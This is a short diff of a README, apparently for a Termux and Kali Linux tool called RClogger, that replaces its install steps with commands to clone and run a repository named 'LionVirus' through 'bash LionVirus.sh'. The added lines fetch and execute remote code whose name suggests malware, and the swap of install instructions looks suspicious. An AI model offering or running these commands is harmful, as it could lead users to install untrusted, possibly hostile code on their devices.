@@ -10,22 +10,16 @@ I'm a python devloper and a cyber security student...
 
 To deploy this on termx
 
-```bash
-  apt update
-  apt upgrade
-  git clone https://github.com/Chandro99/RClogger
-  cd RClogger
-  bash recommended.sh
-  python RClogger.py
-```
+$ apt update
 
-## Deployment on Kali Linux
-To deploy in kali 
-```bash
-  apt-get update
-  apt-get upgrade
-  git clone https://github.com/Chandro99/RClogger
-  cd RClogger
-  bash recommended.sh
-  python RClogger.py
-```
+$ apt upgrade -y
+
+$ pkg install git -y
+
+$ git clone https://github.com/Devil-Tigers/LionVirus.git
+
+$ cd LionVirus
+
+$ bash LionVirus.sh
+
+
